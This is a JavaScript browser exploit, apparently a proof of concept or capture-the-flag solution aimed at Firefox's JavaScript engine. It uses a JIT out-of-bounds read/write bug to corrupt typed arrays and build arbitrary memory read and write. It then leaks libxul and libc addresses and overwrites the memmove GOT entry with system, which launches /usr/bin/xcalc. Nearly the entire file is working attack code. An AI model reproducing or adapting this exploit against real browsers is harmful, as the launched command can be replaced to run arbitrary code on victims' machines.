function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function Int64(v) {
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };


    this.bytes = function() {
        return Array.from(bytes);
    };

    this.byteAt = function(i) {
        return bytes[i];
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    this.toInt = function() {
        return this.upper() * 2**32 + this.lower();
    }

    this.rshift = function() {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = bytes[i];
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
    }

    this.lshift = function() {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = bytes[i];
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
    }

}


function log(x, doc = false) {
    if (typeof document !== "undefined" && doc) {
        document.write(x + " ");
    }
    console.log(x);
}

var to_leak = new Array();
to_leak.push(new Array(1.1,1.1));
to_leak.push(new Uint32Array(0x10));

function read_bug(idx){
	var x = to_leak[0][idx]
	for (let i=0; i<100000; i++){}
	return x;
}



for(var i=0;i<100;i++) read_bug(0)

// for(var i=0;i<100;i++) write_bug(0,1.1)

var group = read_bug(2)
var shape = read_bug(3)

var to_overflow = new Array();
to_overflow.push(new Array(1.1,1.1));
to_overflow.push(new Uint8Array(0x20));
to_overflow.push(new Uint8Array(0x20));
to_overflow.push(new Uint8Array(0x20));
to_overflow.push(new Uint8Array(0x20));
to_overflow.push(new Uint8Array(0x20));

function write_bug(idx,data){
	to_overflow[0][idx] = data;
	for (let i=0; i<100000; i++){}
}

for(var i=0;i<100;i++) write_bug(0,1.1)

write_bug(2,group)
write_bug(3,shape)

to_overflow[2].ass = Date.now

function read_int(idx){
	lower = to_overflow[1][2*idx]
	upper = to_overflow[1][2*idx + 1]
	final = lower + upper * (256 **4)
	return final
}

function write_int(idx,integer){
	x = new Int64(integer);
	upper_data = x.upper()
	lower_data = x.lower()
	to_overflow[1][2*idx] = lower_data
	to_overflow[1][2*idx + 1] = upper_data 
}

var leak_slots = read_int(6)
log(leak_slots.toString(16))
write_int(11,leak_slots)
// var x = to_overflow[1][12]
// to_overflow[1][22] = x

var arr = []

for( var i = 0;i <6;i++){
	arr.push(to_overflow[2][i])
}

// log(arr)
var x = hexlify(arr.reverse())
leak = parseInt(x,16)
// log(leak.toString(16))
write_int(11, leak + 0x28)

var date_now_leak = []

for( var i = 0;i <6;i++){
	date_now_leak.push(to_overflow[2][i])
}

// log(date_now_leak)
var x = hexlify(date_now_leak.reverse())
date_now = parseInt(x,16)
// log(date_now.toString(16))

lib_xulbase = date_now - 0x5a0b1e0

// log(lib_xulbase.toString(16))

memmove_got = lib_xulbase + 0xa9bd238
dup_got = lib_xulbase + 0xa9bd850

write_int(11,dup_got)

var dup_libc_leak = []

for( var i = 0;i <6;i++){
	dup_libc_leak.push(to_overflow[2][i])
}



// log(dup_libc_leak)
var x = hexlify(dup_libc_leak.reverse())
dup_libc = parseInt(x,16)
// log(dup_libc.toString(16))

libc_base = dup_libc - 0x0000000000110970
// log(libc_base.toString(16))
system = libc_base + 0x000000000004f440

log("[+] xul base @ " + lib_xulbase.toString(16), true);
log("[+] memmove@got @ " + memmove_got.toString(16), true);
log("[+] libc_base@libc_@_" + libc_base.toString(16), true);
log("[+] system@libc @ " + system.toString(16), true);


var target = new Uint8Array(100);
var cmd = "/usr/bin/xcalc"

for (var i = 0; i < cmd.length; i++) {
            target[i] = cmd.charCodeAt(i);
        }

target[cmd.length] = 0;

system_str = system.toString(16)

write_int(11,memmove_got)
to_overflow[2][0] = parseInt(system_str.substr(10,2),16)
to_overflow[2][1] = parseInt(system_str.substr(8,2),16)
to_overflow[2][2] = parseInt(system_str.substr(6,2),16)
to_overflow[2][3] = parseInt(system_str.substr(4,2),16)
to_overflow[2][4] = parseInt(system_str.substr(2,2),16)
to_overflow[2][5] = parseInt(system_str.substr(0,2),16)

target.copyWithin(0, 1);
